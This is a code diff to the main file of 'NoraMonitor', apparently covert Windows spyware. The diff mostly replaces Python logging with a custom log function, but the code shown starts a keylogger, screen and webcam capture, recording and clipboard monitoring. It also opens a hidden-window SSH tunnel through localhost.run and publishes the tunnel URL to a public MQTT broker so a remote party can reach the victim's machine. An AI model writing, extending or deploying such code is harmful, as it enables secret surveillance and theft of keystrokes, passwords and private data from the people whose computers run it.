@@ -1,12 +1,9 @@
-from gevent import monkey
-monkey.patch_all()
-
 import os
 import re
 import socket
 import subprocess
 import threading
-import logging
+import traceback
 
 MQTT_BROKER  = "broker.hivemq.com"
 MQTT_TOPIC   = "nora/7638d08dcd8340ef953c"
@@ -24,11 +21,16 @@ PORT = int(os.environ.get("NORA_PORT", 9090))
 _APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
 _RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
 
-logging.basicConfig(
-    filename=os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor", "nora.log"),
-    level=logging.INFO,
-    format="%(asctime)s %(levelname)s %(message)s"
-)
+
+def _log(msg):
+    try:
+        with open(os.path.join(_APP_DIR, "nora.log"), "a") as f:
+            import datetime
+            f.write(f"{datetime.datetime.now()} {msg}\n")
+            f.flush()
+    except Exception:
+        pass
+
 
 def _publish_url(pc_name, tunnel_url):
     try:
@@ -38,9 +40,9 @@ def _publish_url(pc_name, tunnel_url):
         topic = f"{MQTT_TOPIC}/{pc_name.replace(' ', '_')}"
         client.publish(topic, tunnel_url, qos=1, retain=True)
         client.disconnect()
-        logging.info(f"Published URL: {tunnel_url}")
+        _log(f"Published: {tunnel_url}")
     except Exception as e:
-        logging.error(f"MQTT publish failed: {e}")
+        _log(f"MQTT error: {e}")
 
 
 def _start_tunnel(port):
@@ -54,13 +56,13 @@ def _start_tunnel(port):
             ]
             si = subprocess.STARTUPINFO()
             si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            si.wShowWindow = 0  # SW_HIDE
+            si.wShowWindow = 0
             proc = subprocess.Popen(
                 cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                 startupinfo=si
             )
             for line in proc.stdout:
-                logging.info(f"SSH: {line.rstrip()}")
+                _log(f"SSH: {line.rstrip()}")
                 m = re.search(r'https?://[a-z0-9-]{6,}\.(localhost\.run|lhr\.life)', line)
                 if m:
                     tunnel_url = m.group(0)
@@ -73,29 +75,36 @@ def _start_tunnel(port):
                     break
             proc.wait()
         except Exception as e:
-            logging.error(f"Tunnel error: {e}")
+            _log(f"Tunnel error: {e}")
     threading.Thread(target=_run, daemon=True).start()
 
 
 def main():
     os.makedirs(_APP_DIR, exist_ok=True)
     os.makedirs(_RECORDINGS_DIR, exist_ok=True)
-    logging.info("Nora starting")
+    _log("Nora starting")
 
     try:
+        _log("Init recorder")
         recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
+        _log("Init camera")
         camera   = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)
+        _log("Init server")
         server.init(controller.handle_command, recorder, camera)
+        _log("Init keylogger")
         kl.Keylogger(server.broadcast_key).start()
+        _log("Init screencap")
         capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
         capture.attach_recorder(recorder)
         capture.start()
+        _log("Init clipboard")
         cb.ClipboardMonitor(server.broadcast_clipboard).start()
+        _log("Starting tunnel")
         threading.Thread(target=_start_tunnel, args=(PORT,), daemon=True).start()
-        logging.info("Server starting on port %d", PORT)
+        _log("Starting server")
         server.run(port=PORT)
-    except Exception as e:
-        logging.exception(f"Fatal error: {e}")
+    except Exception:
+        _log("CRASH:\n" + traceback.format_exc())
 
 
 if __name__ == "__main__":
